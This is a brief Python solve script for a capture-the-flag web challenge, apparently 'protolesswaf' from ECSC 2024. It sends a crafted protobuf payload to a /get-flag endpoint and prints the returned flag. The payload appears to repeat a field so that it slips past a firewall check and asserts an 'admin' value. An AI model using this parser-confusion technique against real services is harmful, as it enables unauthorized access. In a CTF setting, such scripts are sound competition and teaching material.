#!/usr/bin/env python3

import logging
import os
import requests

logging.disable()

URL = os.environ.get("URL", "http://protolesswaf.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

res = requests.get(URL + "/get-flag?protobuf=08c0c4070a0561646d696e").text

flag = res.split("The flag is: ")[1].split("}")[0] + "}"
print(flag)
